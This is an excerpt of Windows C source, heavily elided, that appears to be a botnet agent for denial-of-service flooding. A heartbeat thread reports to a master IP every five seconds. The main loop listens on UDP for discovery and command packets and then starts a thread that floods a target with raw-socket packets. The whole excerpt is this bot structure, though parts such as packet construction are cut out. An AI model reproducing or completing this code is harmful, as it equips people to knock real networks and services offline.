...
unsigned __stdcall attack_worker(void *arg) {
  ...
  while (attack_active) {
    sendto(raw_sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest,
           sizeof(dest));
    Sleep(10);
  }
...
unsigned __stdcall heartbeat_worker(void *arg) {
  ...
  while (1) {
    sendto(udp_sock, (char *)&pkt, sizeof(pkt), 0, (struct sockaddr *)&dest,
           sizeof(dest));
    Sleep(5000); // 5 sec
  }
  return 0;
...
int main(int argc, char *argv[]) {
  ...
  if (bind(udp_sock, (struct sockaddr *)&server, sizeof(server)) ==
      SOCKET_ERROR) {
  ...
  if (strlen(master_ip) > 0) {
    ...
    printf("[INFO] No Master IP provided (-m). Waiting for Discovery (LAN "
           "only).\n");
  }
  ...
  while (1) {
    int recv_len;
    if ((recv_len = recvfrom(udp_sock, (char *)&pkt, sizeof(pkt), 0,
    ...
    if (pkt.cmd == CMD_DISCOVERY) {
      ...
      sendto(udp_sock, (char *)&reply, sizeof(reply), 0,
             (struct sockaddr *)&si_other, slen);
      ...
      attack_active = 1;
      attack_thread_handle =
          (HANDLE)_beginthreadex(NULL, 0, attack_worker, NULL, 0, NULL);
